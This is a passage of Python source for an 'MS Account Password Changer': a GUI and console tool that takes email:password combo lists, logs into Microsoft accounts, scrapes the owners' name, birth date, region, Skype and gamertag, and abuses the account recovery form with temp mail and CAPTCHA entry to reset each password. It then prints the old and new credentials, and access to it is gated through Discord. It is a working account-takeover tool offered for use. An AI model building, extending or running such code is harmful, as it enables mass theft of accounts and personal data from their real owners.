            _log_to_discord("Password changed", f"{email}: Password changed successfully")
            return new_password

    except Exception as e:
        print("❌ Password reset may have failed.")
        _log_to_discord("Password reset error", f"{email}: Exception during reset: {e}")
    finally:
        driver.quit()


# -----------------------------
# gui/styles.py
# -----------------------------
COLORS = {
    "bg_gradient_start": "#4158D0",
    "bg_gradient_mid": "#C850C0",
    "bg_gradient_end": "#FFCC70",
    "bg_dark": "#1a1a2e",
    "bg_medium": "#16213e",
    "bg_light": "#0f3460",
    "accent_purple": "#8B5CF6",
    "accent_blue": "#3B82F6",
    "accent_teal": "#14B8A6",
    "accent_green": "#10B981",
    "accent_orange": "#F59E0B",
    "text_white": "#FFFFFF",
    "text_gray": "#9CA3AF",
    "success": "#10B981",
    "error": "#EF4444",
    "warning": "#F59E0B"
}

FONTS = {
    "title": ("Arial", 24, "bold"),
    "subtitle": ("Arial", 18, "bold"),
    "heading": ("Arial", 16, "bold"),
    "body": ("Arial", 12),
    "body_bold": ("Arial", 12, "bold"),
    "small": ("Arial", 10),
    "button": ("Arial", 14, "bold")
}

BUTTON_STYLES = {
    "primary": {
        "fg_color": COLORS["accent_purple"],
        "hover_color": COLORS["accent_blue"],
        "text_color": COLORS["text_white"],
        "corner_radius": 10,
        "height": 40
    },
    "success": {
        "fg_color": COLORS["accent_green"],
        "hover_color": COLORS["accent_teal"],
        "text_color": COLORS["text_white"],
        "corner_radius": 10,
        "height": 40
    },
    "danger": {
        "fg_color": COLORS["error"],
        "hover_color": "#DC2626",
        "text_color": COLORS["text_white"],
        "corner_radius": 10,
        "height": 40
    },
    "secondary": {
        "fg_color": COLORS["bg_light"],
        "hover_color": COLORS["bg_medium"],
        "text_color": COLORS["text_white"],
        "corner_radius": 10,
        "height": 40
    }
}

ENTRY_STYLES = {
    "fg_color": COLORS["bg_dark"],
    "border_color": COLORS["accent_purple"],
    "text_color": COLORS["text_white"],
    "corner_radius": 8,
    "height": 40
}

FRAME_STYLES = {
    "fg_color": COLORS["bg_medium"],
    "corner_radius": 15,
    "border_width": 2,
    "border_color": COLORS["accent_purple"]
}

WINDOW_SIZE = {
    "width": 900,
    "height": 650
}

# -----------------------------
# gui/auth_screen.py -> AuthScreen
# -----------------------------
class AuthScreen(ctk.CTkFrame):
    def __init__(self, parent, on_auth_success):
        super().__init__(parent, fg_color=COLORS["bg_dark"])
        self.parent = parent
        self.on_auth_success = on_auth_success
        self.api_client = APIClient()

        self.user_id = None
        self.otp_attempts = 0
        self.max_otp_attempts = 3

        self.create_widgets()

    def create_widgets(self):
        main_frame = ctk.CTkFrame(self, **FRAME_STYLES)
        main_frame.place(relx=0.5, rely=0.5, anchor="center")

        title_label = ctk.CTkLabel(
            main_frame,
            text="MS Account Password Changer",
            font=FONTS["title"],
            text_color=COLORS["text_white"]
        )
        title_label.pack(pady=(30, 10), padx=40)

        subtitle_label = ctk.CTkLabel(
            main_frame,
            text="Discord Authentication Required",
            font=FONTS["subtitle"],
            text_color=COLORS["accent_purple"]
        )
        subtitle_label.pack(pady=(0, 30), padx=40)

        id_label = ctk.CTkLabel(
            main_frame,
            text="Enter Your Discord User ID:",
            font=FONTS["body_bold"],
            text_color=COLORS["text_white"]
        )
        id_label.pack(pady=(10, 5), padx=40)

        self.id_entry = ctk.CTkEntry(
            main_frame,
            **ENTRY_STYLES,
            width=300,
            placeholder_text="793101872784867352"
        )
        self.id_entry.pack(pady=(0, 20), padx=40)

        self.login_button = ctk.CTkButton(
            main_frame,
            text="Continue",
            command=self.check_authorization,
            **BUTTON_STYLES["primary"],
            width=300,
            font=FONTS["button"]
        )
        self.login_button.pack(pady=(0, 30), padx=40)

        self.status_label = ctk.CTkLabel(
            main_frame,
            text="",
            font=FONTS["body"],
            text_color=COLORS["text_gray"]
        )
        self.status_label.pack(pady=(0, 20), padx=40)

    def check_authorization(self):
        user_id = self.id_entry.get().strip()

        if not user_id:
            messagebox.showerror("Error", "Please enter your Discord User ID")
            return

        if not user_id.isdigit():
            messagebox.showerror("Error", "User ID must be numbers only")
            return

        self.user_id = user_id
        self.login_button.configure(state="disabled")
        self.status_label.configure(text="Checking authorization...", text_color=COLORS["warning"])

        self.parent.after(100, self._check_auth_async)

    def _check_auth_async(self):
        # Run network call in background thread to avoid blocking the Tkinter event loop
        def worker():
            authorized, message = self.api_client.check_authorization(self.user_id)
            # Schedule UI updates back on the main thread
            self.parent.after(0, lambda: self._on_check_auth_done(authorized, message))

        threading.Thread(target=worker, daemon=True).start()

    def _on_check_auth_done(self, authorized, message):
        if authorized:
            self.status_label.configure(text="Authorized. Requesting OTP...", text_color=COLORS["success"])
            self.parent.after(500, self.request_otp)
        else:
            self.login_button.configure(state="normal")
            self.status_label.configure(text="", text_color=COLORS["text_gray"])
            self.show_not_authorized()

    def show_not_authorized(self):
        for widget in self.winfo_children():
            widget.destroy()

        error_frame = ctk.CTkFrame(self, **FRAME_STYLES)
        error_frame.place(relx=0.5, rely=0.5, anchor="center")

        error_title = ctk.CTkLabel(
            error_frame,
            text="Not Authorized",
            font=FONTS["title"],
            text_color=COLORS["text_white"]
        )
        error_title.pack(pady=(40, 10), padx=60)

        error_msg = ctk.CTkLabel(
            error_frame,
            text="You are not authorized to use this application.\n\nPlease contact Steve to get authorization.",
            font=FONTS["body"],
            text_color=COLORS["text_gray"],
            justify="center"
        )
        error_msg.pack(pady=(0, 30), padx=60)

        close_button = ctk.CTkButton(
            error_frame,
            text="Close",
            command=self.parent.quit,
            **BUTTON_STYLES["danger"],
            width=200,
            font=FONTS["button"]
        )
        close_button.pack(pady=(0, 40), padx=60)

    def request_otp(self):
        # Run request in a background thread to keep UI responsive
        def worker():
            success, message = self.api_client.request_otp(self.user_id)
            self.parent.after(0, lambda: self._on_request_otp_done(success, message))

        threading.Thread(target=worker, daemon=True).start()

    def _on_request_otp_done(self, success, message):
        if success:
            self.status_label.configure(text="", text_color=COLORS["text_gray"])
            self.show_otp_screen()
        else:
            self.login_button.configure(state="normal")
            self.status_label.configure(text="", text_color=COLORS["text_gray"])
            messagebox.showerror("Error", f"Failed to request OTP: {message}")

    def show_otp_screen(self):
        for widget in self.winfo_children():
            widget.destroy()

        otp_frame = ctk.CTkFrame(self, **FRAME_STYLES)
        otp_frame.place(relx=0.5, rely=0.5, anchor="center")

        title_label = ctk.CTkLabel(
            otp_frame,
            text="OTP Sent",
            font=FONTS["title"],
            text_color=COLORS["text_white"]
        )
        title_label.pack(pady=(30, 10), padx=40)

        info_label = ctk.CTkLabel(
            otp_frame,
            text="Check your Discord DMs for the OTP code.\n\nValid for 5 minutes. Max 3 attempts.",
            font=FONTS["body"],
            text_color=COLORS["text_gray"],
            justify="center"
        )
        info_label.pack(pady=(0, 20), padx=40)

        otp_label = ctk.CTkLabel(
            otp_frame,
            text="Enter OTP:",
            font=FONTS["body_bold"],
            text_color=COLORS["text_white"]
        )
        otp_label.pack(pady=(10, 5), padx=40)

        self.otp_entry = ctk.CTkEntry(
            otp_frame,
            **ENTRY_STYLES,
            width=300,
            placeholder_text="123456",
            justify="center"
        )
        self.otp_entry.pack(pady=(0, 20), padx=40)

        self.verify_button = ctk.CTkButton(
            otp_frame,
            text="Verify OTP",
            command=self.verify_otp,
            **BUTTON_STYLES["success"],
            width=300,
            font=FONTS["button"]
        )
        self.verify_button.pack(pady=(0, 10), padx=40)

        self.attempts_label = ctk.CTkLabel(
            otp_frame,
            text=f"Attempts remaining: {self.max_otp_attempts - self.otp_attempts}",
            font=FONTS["small"],
            text_color=COLORS["text_gray"]
        )
        self.attempts_label.pack(pady=(0, 30), padx=40)

        self.otp_entry.focus()

    def verify_otp(self):
        otp = self.otp_entry.get().strip()

        if not otp:
            messagebox.showerror("Error", "Please enter the OTP")
            return

        if not otp.isdigit() or len(otp) != 6:
            messagebox.showerror("Error", "OTP must be 6 digits")
            return

        self.verify_button.configure(state="disabled")

        # Run verification in background thread
        def worker():
            success, message = APIClient().verify_otp(self.user_id, otp)
            self.parent.after(0, lambda: self._on_verify_otp_done(success, message))

        threading.Thread(target=worker, daemon=True).start()

    def _on_verify_otp_done(self, success, message):
        if success:
            save_session(self.user_id)
            messagebox.showinfo("Success", "Authentication successful!\nYour session has been saved.")
            self.on_auth_success(self.user_id)
        else:
            self.otp_attempts += 1
            remaining = self.max_otp_attempts - self.otp_attempts

            if remaining > 0:
                self.verify_button.configure(state="normal")
                self.otp_entry.delete(0, "end")
                self.attempts_label.configure(text=f"Attempts remaining: {remaining}")
                messagebox.showerror("Error", message)
            else:
                messagebox.showerror("Error", "Maximum attempts exceeded. Please restart the application.")
                self.parent.quit()

# -----------------------------
# gui/main_window.py -> MainWindow
# -----------------------------
class MainWindow(ctk.CTkFrame):
    def __init__(self, parent, user_id):
        super().__init__(parent, fg_color=COLORS["bg_dark"])
        self.parent = parent
        self.user_id = user_id
        self.accounts = []
        self.auto_password = ctk.BooleanVar(value=True)

        self.create_widgets()
        self.clear_all_accounts()

    def create_widgets(self):
        top_frame = ctk.CTkFrame(self, fg_color=COLORS["bg_medium"], height=80)
        top_frame.pack(fill="x", padx=20, pady=(20, 10))
        top_frame.pack_propagate(False)

        title_label = ctk.CTkLabel(
            top_frame,
            text="MS Account Password Changer",
            font=FONTS["title"],
            text_color=COLORS["text_white"]
        )
        title_label.pack(side="left", padx=20, pady=20)

        user_label = ctk.CTkLabel(
            top_frame,
            text=f"Discord ID: {self.user_id}",
            font=FONTS["body"],
            text_color=COLORS["text_gray"]
        )
        user_label.pack(side="right", padx=20, pady=20)

        logout_button = ctk.CTkButton(
            top_frame,
            text="Logout",
            command=self.logout,
            fg_color=COLORS["error"],
            hover_color="#DC2626",
            text_color=COLORS["text_white"],
            corner_radius=8,
            width=100,
            height=35,
            font=FONTS["body"]
        )
        logout_button.pack(side="right", padx=10, pady=20)

        content_frame = ctk.CTkFrame(self, fg_color="transparent")
        content_frame.pack(fill="both", expand=True, padx=20, pady=10)

        left_frame = ctk.CTkFrame(content_frame, **FRAME_STYLES, width=400)
        left_frame.pack(side="left", fill="both", expand=True, padx=(0, 10))

        input_title = ctk.CTkLabel(
            left_frame,
            text="Add Accounts",
            font=FONTS["heading"],
            text_color=COLORS["text_white"]
        )
        input_title.pack(pady=(20, 10), padx=20)

        add_single_btn = ctk.CTkButton(
            left_frame,
            text="Add Single Account",
            command=self.add_single_account,
            **BUTTON_STYLES["primary"],
            width=250,
            font=FONTS["button"]
        )
        add_single_btn.pack(pady=10, padx=20)

        upload_btn = ctk.CTkButton(
            left_frame,
            text="Upload from txt",
            command=self.upload_from_txt,
            **BUTTON_STYLES["secondary"],
            width=250,
            font=FONTS["button"]
        )
        upload_btn.pack(pady=10, padx=20)

        checkbox_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
        checkbox_frame.pack(pady=20, padx=20)

        self.auto_checkbox = ctk.CTkCheckBox(
            checkbox_frame,
            text="Auto Password Set",
            variable=self.auto_password,
            font=FONTS["body_bold"],
            text_color=COLORS["text_white"],
            fg_color=COLORS["accent_purple"],
            hover_color=COLORS["accent_blue"],
            checkmark_color=COLORS["text_white"]
        )
        self.auto_checkbox.pack()

        auto_info = ctk.CTkLabel(
            left_frame,
            text="When checked: auto-generate ShulkerGen######\nWhen unchecked: enter a password for each account",
            font=FONTS["small"],
            text_color=COLORS["text_gray"],
            justify="left"
        )
        auto_info.pack(pady=(0, 10), padx=20)

        clear_btn = ctk.CTkButton(
            left_frame,
            text="Clear All",
            command=self.clear_all_accounts,
            **BUTTON_STYLES["danger"],
            width=250,
            font=FONTS["button"]
        )
        clear_btn.pack(pady=10, padx=20)

        right_frame = ctk.CTkFrame(content_frame, **FRAME_STYLES, width=400)
        right_frame.pack(side="right", fill="both", expand=True, padx=(10, 0))

        list_title = ctk.CTkLabel(
            right_frame,
            text="Account List",
            font=FONTS["heading"],
            text_color=COLORS["text_white"]
        )
        list_title.pack(pady=(20, 10), padx=20)

        self.account_list_frame = ctk.CTkScrollableFrame(
            right_frame,
            fg_color=COLORS["bg_dark"],
            width=350,
            height=350
        )
        self.account_list_frame.pack(pady=10, padx=20, fill="both", expand=True)

        self.count_label = ctk.CTkLabel(
            right_frame,
            text="Accounts: 0",
            font=FONTS["body"],
            text_color=COLORS["text_gray"]
        )
        self.count_label.pack(pady=(5, 20), padx=20)

        bottom_frame = ctk.CTkFrame(self, fg_color="transparent", height=80)
        bottom_frame.pack(fill="x", padx=20, pady=(10, 20))
        bottom_frame.pack_propagate(False)

        self.start_button = ctk.CTkButton(
            bottom_frame,
            text="Start Processing",
            command=self.start_processing,
            **{k: v for k, v in BUTTON_STYLES["success"].items() if k != "height"},
            width=400,
            height=50,
            font=("Arial", 18, "bold")
        )
        self.start_button.pack(pady=15)

    def add_single_account(self):
        dialog = ctk.CTkToplevel(self.parent)
        dialog.title("Add Single Account")
        dialog.geometry("400x250")
        dialog.configure(fg_color=COLORS["bg_dark"])
        dialog.transient(self.parent)
        dialog.grab_set()

        dialog.update_idletasks()
        x = (dialog.winfo_screenwidth() // 2) - (400 // 2)
        y = (dialog.winfo_screenheight() // 2) - (250 // 2)
        dialog.geometry(f"+{x}+{y}")

        title = ctk.CTkLabel(
            dialog,
            text="Enter Account Credentials",
            font=FONTS["heading"],
            text_color=COLORS["text_white"]
        )
        title.pack(pady=(20, 10))

        email_label = ctk.CTkLabel(
            dialog,
            text="Email:Password",
            font=FONTS["body"],
            text_color=COLORS["text_white"]
        )
        email_label.pack(pady=(10, 5))

        entry = ctk.CTkEntry(
            dialog,
            **ENTRY_STYLES,
            width=300,
            placeholder_text="email@example.com:password123"
        )
        entry.pack(pady=(0, 20))
        entry.focus()

        def add():
            combo = entry.get().strip()
            if not combo:
                messagebox.showerror("Error", "Please enter email:password")
                return

            if ':' not in combo:
                messagebox.showerror("Error", "Format must be email:password")
                return

            email, password = combo.split(':', 1)
            if not email or not password:
                messagebox.showerror("Error", "Both email and password are required")
                return

            self.accounts.append({"email": email, "password": password})
            self.update_account_list()
            dialog.destroy()

        add_btn = ctk.CTkButton(
            dialog,
            text="Add Account",
            command=add,
            **BUTTON_STYLES["success"],
            width=200
        )
        add_btn.pack(pady=10)

        entry.bind('<Return>', lambda e: add())

    def upload_from_txt(self):
        file_path = filedialog.askopenfilename(
            title="Select txt file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )

        if not file_path:
            return

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            added = 0
            for line in lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue

                parts = line.split(':', 1)
                if len(parts) == 2:
                    email, password = parts
                    if email and password:
                        self.accounts.append({"email": email.strip(), "password": password.strip()})
                        added += 1

            if added > 0:
                self.update_account_list()
                messagebox.showinfo("Success", f"Added {added} accounts")
            else:
                messagebox.showwarning("Warning", "No valid accounts found in file")

        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {str(e)}")

    def update_account_list(self):
        # Clear current list
        for widget in self.account_list_frame.winfo_children():
            widget.destroy()

        # Add accounts
        for idx, account in enumerate(self.accounts, 1):
            account_frame = ctk.CTkFrame(
                self.account_list_frame,
                fg_color=COLORS["bg_light"],
                corner_radius=8
            )
            account_frame.pack(fill="x", pady=5, padx=5)

            info_label = ctk.CTkLabel(
                account_frame,
                text=f"{idx}. {account['email']}:{account['password']}",
                font=FONTS["body"],
                text_color=COLORS["text_white"],
                anchor="w"
            )
            info_label.pack(side="left", padx=10, pady=10, fill="x", expand=True)

            remove_btn = ctk.CTkButton(
                account_frame,
                text="Remove",
                command=lambda i=idx-1: self.remove_account(i),
                fg_color="transparent",
                hover_color=COLORS["error"],
                width=40,
                height=30
            )
            remove_btn.pack(side="right", padx=5, pady=5)

        # Update count
        self.count_label.configure(text=f"Accounts: {len(self.accounts)}")

    def remove_account(self, index):
        if 0 <= index < len(self.accounts):
            self.accounts.pop(index)
            self.update_account_list()

    def clear_all_accounts(self):
        if not self.accounts:
            return

        if messagebox.askyesno("Confirm", "Clear all accounts?"):
            self.accounts = []
            self.update_account_list()

    def start_processing(self):
        if not self.accounts:
            messagebox.showerror("Error", "Please add at least one account")
            return


        self.pack_forget()
        processing_screen = ProcessingScreen(
            self.parent,
            self.accounts,
            self.auto_password.get(),
            self.user_id
        )
        processing_screen.pack(fill="both", expand=True)
        processing_screen.start_processing()


    def logout(self):
        from tkinter import messagebox
        from utils.session_manager import clear_session

        if messagebox.askyesno("Logout", "Are you sure you want to logout?\n\nYou will need to login again next time."):
            clear_session()
            messagebox.showinfo("Logged Out", "Session cleared. Returning to login screen.")

            # Go back to auth screen
            self.pack_forget()
            self.parent.user_id = None
            self.parent.show_auth_screen()


# -----------------------------
# Console helpers (from original main.py.bak)
# -----------------------------

class Colors:
    """ANSI color codes for console output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_banner():
    """Print application banner"""
    banner = f"""
{Colors.CYAN}{'='*70}
    MS ACCOUNT PASSWORD CHANGER
{'='*70}{Colors.END}
"""
    print(banner)


def print_section(title):
    """Print section header"""
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}{Colors.END}\n")


def print_success(message):
    """Print success message"""
    print(f"{Colors.GREEN}✅ {message}{Colors.END}")


def print_error(message):
    """Print error message"""
    print(f"{Colors.RED}❌ {message}{Colors.END}")


def print_warning(message):
    """Print warning message"""
    print(f"{Colors.YELLOW}⚠️  {message}{Colors.END}")


def print_info(message):
    """Print info message"""
    print(f"{Colors.CYAN}ℹ️  {message}{Colors.END}")


# Console utilities

def load_config_console():
    """Load configuration from config.json"""
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        print_warning("config.json not found. Using defaults.")
        return {"webhook_url": ""}
    except json.JSONDecodeError:
        print_error("config.json is invalid. Using defaults.")
        return {"webhook_url": ""}


def load_accounts_from_file(filename="accounts.txt"):
    """Load accounts from a file"""
    accounts = []

    if not os.path.exists(filename):
        print_error(f"File not found: {filename}")
        return []

    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()

                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue

                # Check for valid format
                if ':' not in line:
                    print_warning(f"Line {line_num}: Invalid format (skipping): {line}")
                    continue

                # Split email:password
                parts = line.split(':', 1)
                if len(parts) != 2:
                    print_warning(f"Line {line_num}: Invalid format (skipping): {line}")
                    continue

                email, password = parts
                email = email.strip()
                password = password.strip()

                if not email or not password:
                    print_warning(f"Line {line_num}: Empty email or password (skipping)")
                    continue

                accounts.append({"email": email, "password": password})

        return accounts

    except Exception as e:
        print_error(f"Error reading file: {e}")
        return []


def get_password_mode():
    """Ask user about password generation mode"""
    print_section("Password Mode")
    print("Choose password mode:")
    print("  1. Auto-generate passwords (ShulkerGen######)")
    print("  2. Enter password manually for each account")

    choice = input(f"\n{Colors.BOLD}Enter choice (1-2): {Colors.END}").strip()
    return choice == "1"


def display_account_summary(accounts):
    """Display summary of accounts to process"""
    print_section("Account Summary")
    print(f"Total accounts to process: {Colors.BOLD}{len(accounts)}{Colors.END}\n")

    for idx, account in enumerate(accounts, 1):
        print(f"  {idx}. {account['email']}")

    print()


def solve_captcha_console(captcha_path):
    """Console-based CAPTCHA solving"""
    print_warning(f"CAPTCHA image saved to: {captcha_path}")
    print_info("Open this image in a browser or image viewer to see the CAPTCHA")
    print_info(f"You can use: file://{os.path.abspath(captcha_path)}")

    captcha_text = input(f"\n{Colors.BOLD}{Colors.YELLOW}Enter CAPTCHA text: {Colors.END}").strip()
    return captcha_text


def process_single_account_console(account, idx, total, auto_password):
    """Process a single account (console)"""
    email = account['email']
    old_password = account['password']

    print_section(f"Processing Account {idx}/{total}")
    print_info(f"Email: {email}")

    try:
        # Determine new password
        if auto_password:
            new_password = generate_shulker_password()
            print_info(f"Generated password: {new_password}")
        else:
            new_password = getpass(f"{Colors.CYAN}Enter new password for {email}: {Colors.END}")
            if not new_password:
                print_error("No password provided. Skipping account.")
                return {"success": False, "email": email, "error": "No password provided"}

        # Scrape account info
        print_info("Scraping account information...")
        account_info = scrape_account_info(email, old_password)

        if account_info.get("error"):
            print_error(f"Failed to scrape: {account_info['error']}")
            return {"success": False, "email": email, "error": account_info['error']}

        print_success("Account information scraped successfully")

        # Submit ACSR form
        print_info("Submitting ACSR form...")
        captcha_img, driver, token, tempmail = submit_acsr_form(account_info)

        if not captcha_img:
            print_error("Failed at ACSR step")
            return {"success": False, "email": email, "error": "ACSR submission failed"}

        print_success(f"ACSR form submitted. Temp mail: {tempmail}")

        # Save CAPTCHA and solve
        captcha_path = f"captcha_{idx}.png"
        with open(captcha_path, 'wb') as f:
            f.write(captcha_img.read())

        captcha_solution = solve_captcha_console(captcha_path)

        # Continue ACSR flow
        print_info("Continuing ACSR flow...")
        reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, f"console_{idx}")

        retry_count = 0
        while reset_link == "CAPTCHA_RETRY_NEEDED" and retry_count < 3:
            retry_count += 1
            print_warning(f"Wrong CAPTCHA - retry {retry_count}/3")

            retry_captcha_path = f"captcha_retry_console_{idx}.png"
            captcha_solution = solve_captcha_console(retry_captcha_path)
            reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, f"console_{idx}")

        if not reset_link or reset_link in ["CAPTCHA_RETRY_NEEDED", "OTP not received.", "CAPTCHA_DOWNLOAD_FAILED"]:
            print_error(f"Failed to get reset link: {reset_link}")
            return {"success": False, "email": email, "error": str(reset_link)}

        print_success("Reset link obtained")

        # Reset password
        print_info("Resetting password...")
        updated_password = perform_password_reset(reset_link, email, new_password)

        print_success("Password changed successfully!")
        print_success(f"New password: {updated_password}")

        result = {
            "success": True,
            "email": email,
            "old_password": old_password,
            "new_password": updated_password,
            "name": account_info.get('name', 'N/A'),
            "dob": account_info.get('dob', 'N/A'),
            "region": account_info.get('region', 'N/A'),
            "skype_id": account_info.get('skype_id', 'N/A'),
            "skype_email": account_info.get('skype_email', 'N/A'),
            "gamertag": account_info.get('gamertag', 'N/A')
        }

        return result

    except Exception as e:
        print_error(f"Error processing account: {str(e)}")
        import traceback
        traceback.print_exc()
        return {"success": False, "email": email, "error": str(e)}


def display_results(results):
    """Display final results"""
    print_section("Processing Complete")

    successful = [r for r in results if r.get("success")]
    failed = [r for r in results if not r.get("success")]

    print(f"{Colors.GREEN}Successful: {len(successful)}{Colors.END}")
    print(f"{Colors.RED}Failed: {len(failed)}{Colors.END}\n")

    if successful:
        print(f"{Colors.BOLD}Successful Accounts:{Colors.END}")
        for result in successful:
            print(f"\n  📧 {result['email']}")
            print(f"     Old Password: {result.get('old_password', 'N/A')}")
            print(f"     New Password: {result.get('new_password', 'N/A')}")
            print(f"     Name: {result.get('name', 'N/A')}")
            print(f"     Gamertag: {result.get('gamertag', 'N/A')}")

    if failed:
        print(f"\n{Colors.BOLD}Failed Accounts:{Colors.END}")
        for result in failed:
            print(f"\n  📧 {result['email']}")
            print(f"     Error: {result.get('error', 'Unknown error')}")


def console_main():
    """Console-mode application (safe for headless)"""
    print_banner()

    # Load configuration
    config = load_config_console()
    # Note: webhooks removed from config; results will be printed to console or handled via Discord bot channels if configured.

    # Get accounts
    if os.path.exists('accounts.txt'):
        accounts = load_accounts_from_file('accounts.txt')
    else:
        accounts = []

    if not accounts:
        print_error("No accounts to process. Provide an accounts.txt or run with --list-accounts to inspect.")
        return

    # Auto password mode
    auto_password = get_password_mode()

    # Summary
    display_account_summary(accounts)

    confirm = input(f"{Colors.BOLD}Start processing? (y/n): {Colors.END}").strip().lower()
    if confirm != 'y':
        print_info("Processing cancelled.")
        return

    results = []
    total = len(accounts)

    for idx, account in enumerate(accounts, 1):
        res = process_single_account_console(account, idx, total, auto_password)
        results.append(res)

    display_results(results)


# -----------------------------
# Application bootstrap (CTk)
# -----------------------------

def main():
    # Print banner for startup feedback
    print_banner()

    ctk.set_appearance_mode("Dark")
    ctk.set_default_color_theme("blue")

    app = ctk.CTk()
    app.title("MS Account Password Changer")
    app.geometry(f"{WINDOW_SIZE['width']}x{WINDOW_SIZE['height']}")

    # Helper methods for screens
    def show_auth_screen():
        # Remove existing main window
        if hasattr(app, 'main_window'):
            app.main_window.pack_forget()
        app.auth_screen = AuthScreen(app, on_auth_success)
        app.auth_screen.pack(fill="both", expand=True)

    def show_main_window(user_id=None):
        if hasattr(app, 'auth_screen'):
            app.auth_screen.pack_forget()
        app.main_window = MainWindow(app, user_id)
        app.main_window.pack(fill="both", expand=True)

    def on_auth_success(user_id):
        # Save session
        save_session(user_id)
        show_main_window(user_id)

    app.show_auth_screen = show_auth_screen
    app.show_main_window = show_main_window
    app.on_auth_success = on_auth_success

    # Auto-login if session exists
    saved = load_session()
    if saved:
        app.user_id = saved
        show_main_window(saved)
    else:
        show_auth_screen()

    app.mainloop()


if __name__ == "__main__":
    # If no display is available (headless), automatically fall back to console mode
    import subprocess

    headless = False
    if platform.system() != "Windows":
        # On Unix-like systems, Tkinter needs $DISPLAY
        if not os.environ.get("DISPLAY"):
            headless = True

    # CLI override flags
    if "--no-gui" in sys.argv:
        headless = True

    if headless:
        print("No display detected or --no-gui given.")

        bak_path = os.path.join(os.path.dirname(__file__), "main.py.bak")
        if os.path.exists(bak_path):
            print("Found legacy console script (main.py.bak). Delegating to it for console mode...")
            rc = subprocess.call([sys.executable, bak_path] + sys.argv[1:])
            sys.exit(rc)

        # If no bak script, run integrated console mode
        print("No console fallback script available. Starting integrated console mode...")
        console_main()
        sys.exit(0)

    try:
        main()
    except Exception as e:
        import traceback
        traceback.print_exc()
        print("Failed to start GUI:", e)
        sys.exit(1)
